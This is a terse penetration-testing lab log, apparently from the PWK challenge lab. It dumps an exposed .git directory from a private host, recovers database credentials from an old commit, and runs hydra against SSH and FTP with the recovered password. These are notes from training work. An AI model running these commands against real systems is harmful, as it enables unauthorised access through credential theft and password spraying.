@@ -1,0 +1,58 @@
+/home/tsorrels/.local/bin/git-dumper http://192.168.193.144/.git .
+
+git log
+commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b (HEAD)
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:27:08 2022 +0200
+
+    Create search.php
+
+commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:26:09 2022 +0200
+
+    Setting up database.php
+
+commit 58cfadc91978ec5db50a03c571493e3038d2935d
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:22:48 2022 +0200
+
+    Create index.php
+
+commit 5e212bcd0b8d5815af1c4fdfccd6a07c16e1330b
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:22:22 2022 +0200
+
+    Create order.php
+
+
+
+git checkout 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
+cat ./config/database.php
+
+
+<?php
+class Database{
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "dean@challenge.pwk";
+    private $password = "BreakingBad92";
+    public $conn;
+    public function getConnection() {
+        $this->conn = null;
+        try{
+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+            $this->conn->exec("set names utf8");
+        }catch(PDOException $exception){
+            echo "Connection error: " . $exception->getMessage();
+        }
+        return $this->conn;
+    }
+}
+?>
+
+
+hydra -L /usr/share/wordlists/metasploit/names -P BreakingBad92 ssh://192.168.193.144
+
+hydra -L /usr/share/wordlists/metasploit/names -P BreakingBad92 ftp://192.168.193.144
+
